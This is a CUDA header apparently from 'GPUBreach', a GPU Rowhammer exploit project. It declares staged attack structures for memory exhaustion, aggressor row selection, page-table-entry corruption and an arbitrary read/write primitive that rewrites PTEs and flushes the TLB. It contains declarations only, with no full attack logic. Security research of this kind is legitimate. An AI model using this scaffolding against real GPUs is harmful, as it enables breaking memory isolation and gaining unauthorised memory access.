#include <algorithm>
#include <cstdlib>
#include <iostream>
#include <map>
#include <rh_utils.cuh>
#include <stdint.h>
#include <string>
#include <vector>

#ifndef GPUBREACH_UTIL_CUH
#define GPUBREACH_UTIL_CUH

struct GPUBreachContext
{
  struct S1_FullMem
  {
    std::vector<uint8_t *> alloc_ptrs;
  };
  S1_FullMem step1_data;

  struct S2_MsgFirstRegion
  {
    std::vector<uint8_t *> agg_ptrs;
    RowList agg_row_list;
    std::vector<uint64_t> agg_vec;
  };
  S2_MsgFirstRegion step2_data;

  struct S3_CorruptPTE
  {
    std::vector<uint8_t *> agg_ptrs; // Keep it to ensure full memory
    std::vector<uint8_t *> region_ptrs;
    uint8_t *corrupted_ptr;
    uint8_t *victim_ptr;
    uint64_t corrupted_id;
    uint64_t victim_id;
  };
  S3_CorruptPTE step3_data;

  struct S4_ExploitComplete
  {
    uint8_t *corrupted_ptr;
    std::vector<uint8_t *> cudaMalloced_ptrs;
  };
  S4_ExploitComplete step4_data;

  struct BitFlipConfig
  {
    BitFlipConfig () {};
    BitFlipConfig (const std::string &config_file);

    // RH Config
    uint64_t num_agg;
    uint64_t step;
    uint64_t row_step;
    uint64_t num_rows;
    uint64_t it;
    uint64_t n;
    uint64_t k;
    uint64_t delay;
    uint64_t period;
    uint64_t repeat;
    uint64_t mem_size;

    // Flip Config
    std::string agg_pat;
    std::string row_set_file;
    bool left;
    uint64_t vic_row;
    uint64_t crit_agg;
  };
  BitFlipConfig bitflip_config;
};

inline bool
debug_enabled ()
{
  static bool enabled = []
    {
      const char *env = std::getenv ("BREACH_DEBUG");
      if (!env)
        return false;

      std::string v (env);
      std::transform (v.begin (), v.end (), v.begin (), ::tolower);

      return !(v == "0" || v == "false" || v == "off" || v == "no");
    }();
  return enabled;
}

#define DBG_OUT                                                               \
  if (!debug_enabled ())                                                      \
    {                                                                         \
    }                                                                         \
  else                                                                        \
    std::cout

const size_t ALLOC_SIZE = 2 * 1024 * 1024;
const size_t GB = 1L * 1024 * 1024 * 1024;
const size_t MB = 1L * 1024 * 1024;
const size_t KB = 1L * 1024;

/************************************ CUDA Kernels
 * *************************************/
__global__ void initialize_memory (uint8_t *array, uint64_t size);

__global__ void initialize_memory_loop (uint8_t *array, uint64_t size);

__global__ void memset_ptr (uint8_t *array, uint64_t src, uint64_t size);

__global__ void print_memory (uint8_t *array, uint64_t size);

template <typename T>
__global__ void
cudaMemcpyKernel (T *dst, const T *src, size_t numElements)
{
  size_t idx = threadIdx.x;
  size_t stride = blockDim.x; // 1024

  for (size_t i = idx; i < numElements; i += stride)
    {
      dst[i] = src[i];
    }
}

// Custom memcpy (device-to-device by default)
/**
 * Note: Somehow more optimized version will not read cudaMallocManaged memory
 * properly. Thus we stick with 1 Block implementation.
 */
template <typename T>
void
cudaMemcpyArray (T *dst, const T *src, size_t numElements,
                 cudaMemcpyKind kind = cudaMemcpyDeviceToDevice)
{
  // Launch the kernel if both pointers are device pointers
  if (kind == cudaMemcpyDeviceToDevice)
    {
      cudaMemcpyKernel<<<1, 1024>>> (dst, src, numElements);
      cudaDeviceSynchronize ();
    }
  else
    {
      // Fallback to standard cudaMemcpy for other directions
      cudaMemcpy (dst, src, numElements * sizeof (T), kind);
    }
  gpuErrchk (cudaPeekAtLastError ());
}

/************************************ GPUBreach Helper Functions
 * *************************************/

void removeFirstNArgs (int &argc, char *argv[], int n);

uint64_t get_memory_limit ();

double time_data_access (uint8_t *array, uint64_t size);

void evict_from_device (uint8_t *array, uint64_t size);

void paused ();

void gen_64KB (uint8_t *array, uint64_t size);

__global__ void simple_flush (uint8_t *array, uint64_t size);

__global__ void check_region_inner (uint8_t *base, uint64_t ALLOC_SIZE);

std::pair<RowList, std::vector<uint64_t>>
get_new_rows (RowList &rows, std::vector<uint64_t> aggressors, uint8_t *layout,  std::vector<uint8_t *> new_base_ptrs);

/************************************ GPUBreach App Helper Functions
 * *************************************/

struct ArbRW_Primtv
{
  uint8_t *flush_ptr = nullptr;
  uint8_t *data_device_ptr = nullptr;
  const uint64_t flush_size = 3L * GB;

  uint64_t arb_rw_phys_ofs = 0;
  uint64_t arb_rw_phys = 0;
  uint8_t *arb_rw_ptr = nullptr;

  uint64_t pt_phys_ofs = 0;
  uint64_t pt_phys = 0;
  uint8_t *pt_ptr = nullptr;

  ArbRW_Primtv ();
  ~ArbRW_Primtv ();

  void gen_64KB ();
  void flush_tlb ();
  void modify (uint64_t pte);
  void modify (uint64_t ofs, uint64_t pte);
  void modify (uint8_t *ptr, uint64_t ofs, uint64_t pte);
};

const uint64_t NULL_PTE = (uint64_t)(0x0600000000000001);

void flush_tlb (uint8_t *flush_ptr, uint64_t flush_size);
void modify (uint8_t *ptr, uint64_t ofs, uint64_t pte);
void setup_cudaMalloc_primitive (ArbRW_Primtv &prim,
                                 std::vector<uint8_t *> &cudaMalloced_ptrs);

#endif /* GPUBREACH_UTIL_CUH */